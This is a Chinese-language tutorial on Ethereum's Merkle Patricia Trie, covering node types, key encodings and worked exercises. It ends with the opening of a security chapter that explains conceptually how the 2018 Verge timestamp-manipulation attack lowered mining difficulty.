<p>前缀树的查找效率是O(m)，m为所查找节点的key长度，而哈希表的查找效率为O(1)。且一次查找会有m次IO开销，相比于直接查找，无论是速率、还是对磁盘的压力都比较大。</p>
<ul>
<li>可能会造成空间浪费</li>
</ul>
<p>当存在一个节点，其key值内容很长（如一串很长的字符串），当树中没有与他相同前缀的分支时，为了存储该节点，需要创建许多非叶子节点来构建根节点到该节点间的路径，造成了存储空间的浪费。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233082.jpg" alt="img"></p>
<p><strong>对前缀树的改进：Patricia树</strong></p>
<p>Patricia trie，压缩前缀树，是一种更节省空间的Trie。对于基数树的每个节点，如果该节点是唯一的儿子的话，就和父节点合并。</p>
<p>如之前所提及的，前缀树中会出现严重的存储空间浪费的情况，如上图。图中右侧有一长串节点，这些节点大部分只是充当非叶子节点，用来构建一条路径，目的只是为了存储该路径上的叶子节点。</p>
<p>针对这种情况，MPT树对此进行了优化：当MPT试图插入一个节点，插入过程中发现目前没有与该节点Key拥有相同前缀的路径。此时MPT把<strong>剩余的Key</strong>存储在叶子／扩展节点的Key字段中，充当一个”Shortcut“。</p>
<p>下图中对应着将5个单词test、toaster、toasting、slow、slowly插入到树中，其中有三个单词共享t前缀，两个单词共享s前缀，t和s不同，所以在根节点上有两个分支。在左边的分支（t）上，有两个分支，而且est是没有和其他任何单词共享前缀，也即父节点只有一个孩子，则est可以被压缩。类似地oast和slow以及ly可以进行压缩。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233083.jpg" alt="img"></p>
<p>这种做法有以下几点优势：</p>
<ul>
<li>提高节点的查找效率，避免过多的磁盘访问；</li>
<li>减少存储空间浪费，避免存储无用的节点；</li>
</ul>
<p>另外，再看一个例子，这种树可以用来存键值对，key就是路径上的字符串，value的值存储在叶子节点。：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233084.jpg" alt="img"></p>
<p>树中所存储的键值对：</p>
<ul>
<li>6c0a5c71ec20bq3w &#x3D;&gt; 5</li>
<li>6c0a5c71ec20CX7j &#x3D;&gt; 27</li>
<li>6c0a5c71781a1FXq &#x3D;&gt; 18</li>
<li>6c0a5c71781a9Dog &#x3D;&gt; 64</li>
<li>6c0a8f743b95zUfe &#x3D;&gt; 30</li>
<li>6c0a8f743b95jx5R &#x3D;&gt; 2</li>
<li>6c0a8f740d16y03G &#x3D;&gt; 43</li>
<li>6c0a8f740d16vcc1 &#x3D;&gt; 48</li>
</ul>
<p>就以太坊而言，状态树的键 &#x2F; 值映射是地址与相关账户之间的映射，即指向每个账户的 balance、nonce、codeHash 和 storageRoot。</p>
<hr>
<p><strong>在以太坊中的MPT树中，树节点可以分为以下四类：</strong></p>
<ul>
<li>空节点：(represented as the empty string)</li>
<li>分支节点：A 17-item node<code>[ v0 ... v15, vt ]</code></li>
<li>叶子节点：A 2-item node<code>[ encodedPath, value ]</code></li>
<li>扩展节点：A 2-item node<code>[ encodedPath, key ]</code></li>
</ul>
<p>空节点，简单的表示空，在代码中是一个空串。</p>
<p>叶子节点（leaf），表示为[key,value]的一个键值对，其中key是key的一种特殊十六进制编码，value是value的RLP编码。</p>
<p>扩展节点（extension），也是[key，value]的一个键值对，但是这里的value是其他节点的hash值，这个hash可以被用来查询数据库中的节点。也就是说通过hash链接到其他节点。</p>
<p>分支节点（branch），因为MPT树中的key被编码成一种特殊的16进制的表示，再加上最后的value，所以分支节点是一个长度为17的list，前16个元素对应着key中的16个可能的十六进制字符，如果有一个[key,value]对在这个分支节点终止，最后一个元素代表一个值，即分支节点既可以搜索路径的终止也可以是路径的中间节点。</p>
<p><strong>分支节点</strong></p>
<p>分支节点用来表示MPT树中所有拥有超过1个孩子节点以上的非叶子节点， 其定义如下所示：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">type fullNode struct &#123;</span><br><span class="line">        Children [17]node // Actual trie node data to encode/decode (needs custom encoder)</span><br><span class="line">        flags    nodeFlag</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// nodeFlag contains caching-related metadata about a node.</span><br><span class="line">type nodeFlag struct &#123;</span><br><span class="line">    hash  hashNode // cached hash of the node (may be nil)</span><br><span class="line">    gen   uint16   // cache generation counter</span><br><span class="line">    dirty bool     // whether the node has changes that must be written to the database</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>与前缀树相同，MPT同样是把key-value数据项的key编码在树的路径中，但是key的每一个字节值的范围太大（[0-127]），因此在以太坊中，在进行树操作之前，首先会进行一个key编码的转换（下节会详述），将一个字节的高低四位内容分拆成两个字节存储。通过编码转换，<code>key&#39;</code>的每一位的值范围都在[0, 15]内。因此，一个分支节点的孩子至多只有16个。以太坊通过这种方式，减小了每个分支节点的容量，但是增加了树高。</p>
<p>分支节点的孩子列表中，最后一个元素是用来存储自身的内容。</p>
<p>此外，每个分支节点会有一个附带的字段<code>nodeFlag</code>，记录了一些辅助数据：</p>
<ul>
<li>节点哈希：若该字段不为空，则当需要进行哈希计算时，可以跳过计算过程而直接使用上次计算的结果（当节点变脏时，该字段被置空）；</li>
<li>脏标志：当一个节点被修改时，该标志位被置为1；</li>
<li>诞生标志：当该节点第一次被载入内存中（或被修改时），会被赋予一个计数值作为诞生标志，该标志会被作为节点驱除的依据，清除内存中“太老”的未被修改的节点，防止占用的内存空间过多；</li>
</ul>
<p><strong>叶子节点&amp;&amp;扩展节点</strong></p>
<p>叶子节点与扩展节点的定义相似，如下所示：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">type shortNode struct &#123;</span><br><span class="line">        Key   []byte</span><br><span class="line">        Val   node</span><br><span class="line">        flags nodeFlag</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中关键的字段为：</p>
<ul>
<li>Key：用来存储***属于该节点范围的key***；</li>
<li>Val：用来存储该节点的内容；</li>
</ul>
<p>其中<code>Key</code>是MPT树实现树高压缩的关键。当MPT试图插入一个节点，插入过程中发现目前没有与该节点Key拥有相同前缀的路径。此时MPT把***剩余的Key***存储在叶子／扩展节点的Key字段中，充当一个”Shortcut“。【可以结合上面toasting的例子】</p>
<p>此外Val字段用来存储叶子／扩展节点的内容，对于叶子节点来说，该字段存储的是一个数据项的内容；而对于扩展节点来说，该字段可以是以下两种内容：</p>
<ol>
<li>Val字段存储的是其孩子节点在数据库中存储的索引值（其实该索引值也是孩子节点的哈希值）；</li>
<li>Val字段存储的是其孩子节点的引用；</li>
</ol>
<p>由于叶子&#x2F;扩展节点共享一套定义，那么怎么来区分Val字段存储的到底是一个数据项的内容，还是一串哈希索引呢？在以太坊中，通过在Key中加入特殊的标志来区分两种类型的节点。</p>
<h2 id="还有一个重要的概念是：key值编码"><a href="#还有一个重要的概念是：key值编码" class="headerlink" title="还有一个重要的概念是：key值编码"></a><strong>还有一个重要的概念是：key值编码</strong></h2><p>在以太坊中，MPT树的key值共有三种不同的编码方式，以满足不同场景的不同需求，在这里单独作为一节进行介绍。</p>
<p>三种编码方式分别为：</p>
<ol>
<li>Raw编码（原生的字符）；</li>
<li>Hex编码（扩展的16进制编码）；</li>
<li>Hex-Prefix编码（16进制前缀编码）；</li>
</ol>
<h3 id="Raw编码"><a href="#Raw编码" class="headerlink" title="Raw编码"></a>Raw编码</h3><p>Raw编码就是原生的key值，不做任何改变。这种编码方式的key，是MPT对外提供接口的默认编码方式。</p>
<blockquote>
<p>例如一条key为“cat”，value为“dog”的数据项，其Raw编码就是[‘c’, ‘a’, ‘t’]，换成ASCII表示方式就是[63, 61, 74]</p>
</blockquote>
<h3 id="Hex编码"><a href="#Hex编码" class="headerlink" title="Hex编码"></a>Hex编码</h3><p>在介绍分支节点的时候，我们介绍了，为了减少分支节点孩子的个数，需要将key的编码进行转换，将原key的高低四位分拆成两个字节进行存储。这种转换后的key的编码方式，就是Hex编码。</p>
<p>从Raw编码向Hex编码的转换规则是：</p>
<ul>
<li>将Raw编码的每个字符，根据高4位低4位(nibble)拆成两个字节；</li>
<li>若该Key对应的节点存储的是真实的数据项内容（即该节点是叶子节点），则在末位添加一个ASCII值为16的字符作为终止标志符；</li>
<li>若该key对应的节点存储的是另外一个节点的哈希索引（即该节点是扩展节点），则不加任何字符；</li>
</ul>
<blockquote>
<p>key为“cat”, value为“dog”的数据项，其Hex编码为[6, 3, 6, 1, 7, 4, 10]</p>
</blockquote>
<p><em>Hex编码用于对内存中MPT树节点key进行编码</em></p>
<h3 id="HP编码"><a href="#HP编码" class="headerlink" title="HP编码"></a>HP编码</h3><p>MPT树中另外一个重要的概念是一个特殊的十六进制前缀(hex-prefix, HP)编码，用来对key进行编码。因为有两种[key,value]节点(叶节点和扩展节点)，所以需要对它们进行区分。此时，引进一种特殊的标识（一个bit即可）来标识key所对应的是值是叶子，还是其他节点的hash。如果标识符是1，那么key对应的是叶节点，反之则是扩展节点。</p>
<p>另外需要注意的一点是，在某个节点处，当前路径的长度可能是奇数。此时会面临的一个问题是，因为路径本身是按照4位，也即一个nibble为单位的，但是存储的时候总是以字节为单位的。假设当前有两个路径分别是‘136’和‘0136’，在存储的时候是没有办法区分的，因为以字节为单位进行存储的时候，总是会转化为01 + 36两个字节。所以，在HP编码中，还必须有一个标识进行路径长度奇偶性的标识。【注：要结合下面具体的例子看，这里的路径不是从根到叶子的完整的路径（总是偶数），而是当前在叶子节点&#x2F;扩展节点中存储的路径的长度】</p>
<p>所以在MPT树中，对每个路径（叶子节点首先移除末尾的16），总是要首先加上一个nibble，这个Nibble的最低位表示节点路径长度奇偶性，第二低位表示节点的性质。</p>
<p>如果key是偶数长度，那么因为又加了一个四个比特，所以需要加上另外一个值为0的nibble，使得整体长度为偶数。</p>
<p>HP编码的规则如下：</p>
<ul>
<li>若原key的末尾字节的值为16（即该节点是叶子节点），去掉该字节；</li>
<li>在key之前增加一个半字节，其中最低位用来编码原本key长度的奇偶信息，key长度为奇数，则该位为1；低2位中编码一个特殊的终止标记符，若该节点为叶子节点，则该位为1；</li>
<li>若原本key的长度为偶数，则在key之前再增加一个值为0x0的<strong>半字节</strong>；</li>
<li>将原本key的内容作压缩，即将两个字符以高4位低4位进行划分，存储在一个字节中（Hex扩展的逆过程）；</li>
</ul>
<blockquote>
<p>若Hex编码为[6, 3, 6, 1, 7, 4, 10]，则HP编码的值为[20, 63, 61, 74]</p>
</blockquote>
<p>所添加的nibble的值和所对应的节点的路径的性质表如下：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hex char    bits    |    node type partial     path length</span><br><span class="line">----------------------------------------------------------</span><br><span class="line">   0        0000    |       extension              even        </span><br><span class="line">   1        0001    |       extension              odd         </span><br><span class="line">   2        0010    |   terminating (leaf)         even        </span><br><span class="line">   3        0011    |   terminating (leaf)         odd</span><br></pre></td></tr></table></figure>

<p>根据bits可以判断出节点的类型和搜索路径长度的奇偶性。0000，查看最后两位的情况，倒数第二位是0，说明是extension节点；最后一位是0，说明路径长度是偶数。0011，最后两位的值是11，第二低位是1说明是扩展节点，最后一位是1说明路径长度为奇数。剩下两种情况类似可分析。</p>
<p><strong>转换关系</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233085.jpg" alt="img"></p>
<p>以上三种编码方式的转换关系为：</p>
<ul>
<li>Raw编码：原生的key编码，是MPT对外提供接口中使用的编码方式，当数据项被插入到树中时，Raw编码被转换成Hex编码；</li>
<li>Hex编码：16进制扩展编码，用于对内存中树节点key进行编码，当树节点被持久化到数据库时，Hex编码被转换成HP编码；</li>
<li>HP编码：16进制前缀编码，用于对数据库中树节点key进行编码，当树节点被加载到内存时，HP编码被转换成Hex编码；</li>
</ul>
<p>下面结合一个具体的例子再来描述一遍这个过程。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233086.jpg" alt="img">官方示例</p>
<p>在上图中，共有四个键值对。四个key有共同的前缀a7，因此，第一个节点（也是root节点）是一个扩展节点。之后接下来有三个分支，分别是1、7和f。因此，扩展节点之后跟着一个分支节点，分支节点中有三个分支。其中分支1和7之后只有一个节点，因此直接到达了叶子节点。分支7之后有两个节点，并且这两个节点有共同的前缀‘d3’，所以分支7连着一个扩展节点。扩展节点之后有两个分支，3和9，因此再跟上一个分支节点。分支节点之后是两个叶子节点。</p>
<p>然后再分析一下前缀的情况。在路径为’a7’的扩展节点中，路径长度为偶数，本身为扩展节点，因此，第一个nibble为0000，长度为偶数，添加一个nibble 0000，前缀应该为00。第二层的两个叶子节点，长度都为偶数，所以第一个nibble是0010，再添加一个nibble 0000,所以最终前缀应该为20。第二层中的扩展节点，同样长度为偶数，所以前缀应该是00。最后一层的叶子节点中，长度为奇数，所以添加的nibble是0011，也即3。</p>
<p>练习：</p>
<p>完成下列节点的Hex编码到HP编码。</p>
<p>&gt; [ 1, 2, 3, 4, 5, …] 【扩展结点，路径长度为奇数，添加01（bit），也即1(nibble)】<br>‘11 23 45’<br>&gt; [ 0, 1, 2, 3, 4, 5, …]【扩展结点，路径长度为偶数，添加00，也即0，然后补一个0000】<br>‘00 01 23 45’<br>&gt; [ 0, f, 1, c, b, 8, 10] 【叶子节点，长度为偶数（最后一个10也即16，补充位，需要移除），添加10，也即2，然后补0000，也即0】<br>‘20 0f 1c b8’<br>&gt; [ f, 1, c, b, 8, 10] 【叶子节点，长度为奇数，添加11，也即3】<br>‘3f 1c b8’</p>
<p>请画出下面的MPT。</p>
<p>Suppose we want a trie containing four path&#x2F;value pairs <code>(&#39;do&#39;, &#39;verb&#39;)</code>, <code>(&#39;dog&#39;, &#39;puppy&#39;)</code>, <code>(&#39;doge&#39;, &#39;coin&#39;)</code>, <code>(&#39;horse&#39;, &#39;stallion&#39;)</code>.</p>
<p>First, we convert both paths and values to <code>bytes</code>. Below, actual byte representations for <em>paths</em>are denoted by <code>&lt;&gt;</code>, although <em>values</em> are still shown as strings, denoted by <code>&#39;&#39;</code>, for easier comprehension (they, too, would actually be <code>bytes</code>):</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;64 6f&gt; : &#x27;verb&#x27;</span><br><span class="line">&lt;64 6f 67&gt; : &#x27;puppy&#x27;</span><br><span class="line">&lt;64 6f 67 65&gt; : &#x27;coin&#x27;</span><br><span class="line">&lt;68 6f 72 73 65&gt; : &#x27;stallion&#x27;</span><br></pre></td></tr></table></figure>

<p>Now, we build such a trie with the following key&#x2F;value pairs in the underlying DB:</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rootHash: [ &lt;16&gt;, hashA ]</span><br><span class="line">hashA:    [ &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, hashB, &lt;&gt;, &lt;&gt;, &lt;&gt;, hashC, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt; ]</span><br><span class="line">hashC:    [ &lt;20 6f 72 73 65&gt;, &#x27;stallion&#x27; ]</span><br><span class="line">hashB:    [ &lt;00 6f&gt;, hashD ]</span><br><span class="line">hashD:    [ &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, hashE, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &#x27;verb&#x27; ]</span><br><span class="line">hashE:    [ &lt;17&gt;, hashF ]</span><br><span class="line">hashF:    [ &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, hashG, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &#x27;puppy&#x27; ]</span><br><span class="line">hashG:    [ &lt;35&gt;, &#x27;coin&#x27; ]</span><br></pre></td></tr></table></figure>

<p>以上四个键，共享一个公共前缀6，所以第一个节点应该是扩展节点，其后4和8有两个分支，因此扩展节点之后跟着分支节点，其中第一个分支节点4之后有三个有共同前缀‘6f’键值对，所以分支4之后是一个扩展节点。而8之后只有一个节点，所以8之后是一个叶子节点。4之后的扩展节点有共同前缀‘6f’，‘6f‘之后有两种情况，分别是空和‘6’。所以该扩展节点之后跟着分支节点。分支节点中6之后跟着扩展节点，因为有两个键值对共享7前缀。空的位置则对应着‘verb’值本身。6之后的扩展节点的共享前缀是’7’，7之后有两种情况，分别是空和’6’。类似地，空的位置对应着单词’puppy’；分支6之后对应着叶子节点‘coin’。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233087.jpg" alt="img"></p>
<p>最后，再构造好Particia树之后，是怎么样和Merkle树结合起来了呢？这里主要是如上所示，对所有的节点的值都做了Hash。</p>
<p>增加一个练习：</p>
<p>Whenever a new item is added to the trie the algorithm can decide whether to insert a branch, a leaf or an extension. Let’s say you need to insert 3 key-value pairs:</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;0x01&quot;: 1</span><br><span class="line">&quot;0x01234&quot;: 2</span><br><span class="line">&quot;0x01235&quot;: 3</span><br></pre></td></tr></table></figure>

<p>After “0x01” is inserted the trie will look like this (<code>hash0</code> is root):</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;hash0&gt; leaf [&quot;0x01&quot;, 1]</span><br></pre></td></tr></table></figure>

<p>After “0x01234” is inserted (<code>hash1</code> is root):</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;hash1&gt; extension [&quot;0x01&quot;, &lt;hash2&gt;]</span><br><span class="line">&lt;hash2&gt; branch [NULL,NULL,&lt;hash3&gt;,..&lt;13 NULLs&gt;.., 1]</span><br><span class="line">&lt;hash3&gt; leaf [&quot;0x34&quot;, 2]</span><br></pre></td></tr></table></figure>

<p>After “0x01235” is inserted (<code>hash4</code> is root):</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;hash4&gt; extension [&quot;0x01&quot;, &lt;hash5&gt;]</span><br><span class="line">&lt;hash5&gt; branch [NULL,NULL,&lt;hash6&gt;,..&lt;13 NULLs&gt;.., 1]</span><br><span class="line">&lt;hash6&gt; extension [&quot;0x3&quot;, &lt;hash7&gt;]</span><br><span class="line">&lt;hash7&gt; branch [NULL,NULL,NULL,NULL,&lt;hash8&gt;,&lt;hash9&gt;..&lt;10 NULLs&gt;.., NULL]</span><br><span class="line">&lt;hash8&gt; leaf [&quot;&quot;, 2]</span><br><span class="line">&lt;hash9&gt; leaf [&quot;&quot;, 3]</span><br></pre></td></tr></table></figure>

<p>Generally, while inserting a key-value pair:</p>
<ul>
<li>if you stopped at a NULL node, you add a new leaf node with the remaining path and replace NULL with the hash of the new leaf.</li>
<li>if you stopped at a leaf node, you need to convert it to an extension node and add a new branch and 1 or 2 leafs.</li>
<li>if you stopped at an extension node, you convert it to another extension with shorter path and create a new branch and 1 or 2 leafs. If the new path turns out to be empty you convert it to a branch instead.</li>
</ul>
<p>When deleting a key-value pair:</p>
<ul>
<li>if there is a branch that has a single non NULL nibble and NULL value, this branch can be replaced with a leaf or an extension.</li>
<li>if there is an extension that points to another extension or a leaf, it can be collapsed into a single extension&#x2F;leaf.</li>
<li>if there is branch with all NULL nibbles and non NULL value, it can be converted into a leaf.</li>
</ul>
<p>I most likely missed a few cases but I hope the general idea is clear. When adding&#x2F;deleting key-value pairs the algorithm can make the decision locally at the current node, there is no need to create an unpacked version of the trie first and then pack it.</p>
<p>参考：</p>
<ol>
<li><a href="https://link.zhihu.com/?target=https://ethfans.org/wikis/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%8E%86%E5%8F%B2">EthFans | 以太坊爱好者</a></li>
<li><a href="https://link.zhihu.com/?target=https://github.com/ethereum/wiki/wiki/Patricia-Tree">ethereum&#x2F;wiki</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.8btc.com/article/73758">谈谈以太坊的Merkle树_巴比特_服务于区块链创新者</a></li>
<li><a href="https://link.zhihu.com/?target=https://blog.csdn.net/qq_33935254/article/details/55505472">深入浅出以太坊MPT（Merkle Patricia Tree）</a></li>
<li><a href="https://link.zhihu.com/?target=https://segmentfault.com/a/1190000016050921">以太坊源码分析 MPT - SegmentFault</a></li>
<li><a href="https://link.zhihu.com/?target=https://blog.bitmex.com/zh_cn-complete-guide-to-proof-of-stake-ethereums-latest-proposal-amp-vitalik-buterin-interview/">https://blog.bitmex.com/zh_cn-complete-guide-to-proof-of-stake-ethereums-latest-proposal-amp-vitalik-buterin-interview&#x2F;</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.chainnews.com/articles/754796689749.htm">https://www.chainnews.com/articles/754796689749.htm</a></li>
<li><a href="https://link.zhihu.com/?target=https://ethfans.org/posts/ethereum-explained-merkle-trees-world-state-transactions-and-more">https://ethfans.org/posts/ethereum-explained-merkle-trees-world-state-transactions-and-more</a></li>
<li><a href="https://link.zhihu.com/?target=http://soliloquy0810.cn/2019/03/23/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E4%B8%AD%E7%9A%84%E7%8A%B6%E6%80%81%E6%A0%91%E3%80%81%E4%BA%A4%E6%98%93%E6%A0%91%E3%80%81%E6%94%B6%E6%8D%AE%E6%A0%91/">http://soliloquy0810.cn/2019/03/23/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E4%B8%AD%E7%9A%84%E7%8A%B6%E6%80%81%E6%A0%91%E3%80%81%E4%BA%A4%E6%98%93%E6%A0%91%E3%80%81%E6%94%B6%E6%8D%AE%E6%A0%91/</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.infoq.cn/article/how-does-ethereum-work-anyway">https://www.infoq.cn/article/how-does-ethereum-work-anyway</a></li>
<li><a href="https://link.zhihu.com/?target=https://harry.uno/post/merkle-patricia-tree.html">https://harry.uno/post/merkle-patricia-tree.html</a></li>
<li><a href="https://link.zhihu.com/?target=https://masterthecrypto.com/ethereum-what-is-gas-gas-limit-gas-price/">https://masterthecrypto.com/ethereum-what-is-gas-gas-limit-gas-price/</a></li>
<li><a href="https://link.zhihu.com/?target=https://medium.com/cybermiles/diving-into-ethereums-world-state-c893102030ed">https://medium.com/cybermiles/diving-into-ethereums-world-state-c893102030ed</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.jianshu.com/p/e67452930dcc">https://www.jianshu.com/p/e67452930dcc</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.cnblogs.com/luosongchao/p/3239521.html">https://www.cnblogs.com/luosongchao/p/3239521.html</a></li>
<li><a href="https://link.zhihu.com/?target=https://ethereum.stackexchange.com/questions/39915/ethereum-merkle-patricia-trie-extension-node">https://ethereum.stackexchange.com/questions/39915/ethereum-merkle-patricia-trie-extension-node</a></li>
<li><a href="https://link.zhihu.com/?target=http://www.jouypub.com/2018/9b19cff7135411bd37356e6c4f5f63b7/">http://www.jouypub.com/2018/9b19cff7135411bd37356e6c4f5f63b7/</a></li>
<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/28928827">https://zhuanlan.zhihu.com/p/28928827</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.hellobtc.com/kp/kc/201904/1562.html">https://www.hellobtc.com/kp/kc/201904/1562.html</a></li>
</ol>
<h1 id="区块链技术12：区块链安全（1）"><a href="#区块链技术12：区块链安全（1）" class="headerlink" title="区块链技术12：区块链安全（1）"></a>区块链技术12：区块链安全（1）</h1><p>在引入比特币等加密货币时，一个经常提及的概念是支撑着这些加密货币的底层框架——区块链协议非常地安全可靠。各种加密算法保证了区块链的正常运行，区块链中的信息不可篡改、不能删除，基于工作量的证明保证难以有攻击者可以控制网络。在这些良好性质的支持下，加密货币系统得到了快速的发展。</p>
<p>但是，对加密货币的绝对安全的期望是错误的。接下来，我们将看一些具体的例子，查看其中加密货币系统是如何被攻击的。第一个例子，攻击者针对的是区块链的底层运行算法；第二个例子，攻击者利用的则是区块链上智能合约的编写。</p>
<h2 id="verge"><a href="#verge" class="headerlink" title="verge"></a>verge</h2><p>verge是一种规模相对较小的加密货币。在2018年4月 4 日至 6 日这段时间里，黑客成功地控制了 Verge 网络三次，每次持续几个小时，在此期间，黑客阻止了任何其他用户进行支付。而且在此期间他们能够以 1560 枚每秒（大约 $80）的速度伪造 Verge 币，共伪造价值超百万美元的 Verge 币。</p>
<p>看到这个攻击效果时，我们来想一想，什么样的攻击能够达到这个效果？</p>
<p>其他用户完全不能支付，也就意味着这些用户产生的交易始终不能被打包到区块中，不能获得确定，从而相当于是不能进行支付。如何伪造Verge币呢？持续产生区块就行。那如何能持续产生区块呢？那就要比其他用户更快地产生区块。换言之，就是要控制网络中超过51%的算力。</p>
<p>51%攻击我们在双重支付的时候提到过，如果攻击者能够控制51%的算力，那么他们就可以控制产生的区块，在区块中包括双重支付的交易，或者在包括双重支付的交易之后进行延续。但当时我们也分析了，首先，在比特币系统中，在拥有大量的矿工和矿池的情况下，任何人想要控制51%的算力基本是不可能的；其次，如果有人真正控制了51%的算力，那么他会选择遵守和维护这个秩序，从而避免自己的投资浪费掉。</p>
<p>那这个针对Verge的攻击是怎么回事呢？攻击者其实并没有真正掌握51%的算力。</p>
<p>控制51%的算力实际上就是要比别人更快地进行哈希，找出来满足区块产生难度的哈希值。那如果不能在算力上占优，有没有可能降低区块的难度？</p>
<p>在比特币系统中，产生区块的难度是可以动态调节的。难度值被设定在无论节点计算能力如何，新区块产生速率都保持在每10分钟一个。难度的调整是在每个完整节点中独立自动发生的。每2016个区块，所有节点都会按统一的公式自动调整难度。</p>
<p>在Verge系统中，也有类似的机制。Verge希望维持足够的去中心化，也即让个人计算机这样的小型设备能参与计算；但为了防止过快产生区块，Verge规定每隔 30 秒产生一个区块。为了实现这一点，Verge的挖矿难度是根据区块确认速率动态调整的。如果更多的人决定投入更多的算力产生 Verge 区块，那么挖矿速率会变快，Verge 区块链协议将增加挖矿难度，从而限制区块提交速率。相反，随着挖矿算力下降以及区块产生间隔增加，挖矿会变得更加容易。因此，当网络正常运行时，不管外界环境如何，Verge 网络都能够实时处理，并且引导网络达到目标区块产生速率的均衡。从设计目的而言，这个设计毫无疑问是非常人性化的，用户友好的。</p>
<p>Verge 用来计算密码学难题的共识算法是 Dark Gravity Wave，它对 30 分钟内滑动窗口的区块确认速率取加权平均值。这样的后果是，挖矿难度是最近区块产生速率的函数，而基于区块产生频率进行挖矿难度计算自然需要查看区块时间戳。</p>
<p>这里还涉及到一个问题：在区块链系统是，区块时间戳允许乱序。</p>
<p>在区块链协议中，单笔交易被分组打包到一个区块中，作为整体进行确认。每一个区块都有一个其创建日期的时间戳。即使区块链协议正常运行，在某些情况下这些时间戳也可能是乱序的，即，第 100 个区块的时间戳可能<em>晚于</em>第 101 个区块。这是因为，在去中心化系统中，进行时间同步确实是一件很难的事情。即便所有节点都是诚实的，区块的时间戳也绝对有可能出现“乱序”的情况。换句话说，在去中心化系统中，允许乱序才是正常的；在 Verge 被黑客攻击之前，它允许接收的区块时间戳“窗口”至多为2个小时。在Verge攻击之后，这个窗口被缩小到15分钟。</p>
<p>现在，如果有人创建出足够多的错误时间戳，那么就会影响Verge的区块产生速率的判断，从而降低区块的产生难度。在黑客几次攻击的时间里，每隔一个区块的提交时间戳大约比区块加入区块链的时间早一个小时，这就使得协议的挖矿调整算法输出结果惨不忍睹了。如果协议能够流利地讲英语的话，它将会说：“Oh no！Not enough blocks have been submitted recently！Mining must be too difficult——let’s make it easier！”（哦，不！最近提交的区块数量不够！挖矿算法一定是太难了——让我们调整的简单一些吧！）由于时间戳持续被篡改，协议持续降低挖矿难度，直到挖矿变得非常容易。总的来说，攻击前几个小时的平均难度是 1393093.39131，在攻击期间它的难度降低到 0.00024414，难度降低了超过 99.999999%。更低的挖款难度意味着能够提交更多的区块——在这种情况下，大约每秒产生一个区块。</p>
<p>如果仅仅是这样的话，攻击者并没有捞到什么好处，因为，如果系统调低了产生区块的难度，那么所有矿工的难度都降低了，攻击者还是需要和其他人进行竞争。这时，就需要利用Verge的另一个特点——Verge 使用了五种算法是 Scrypt，X17，Lyra2rev2，myrgroestl 以及 blake2s作为工作量证明的算法。（作为对比，比特币是SHA256）</p>
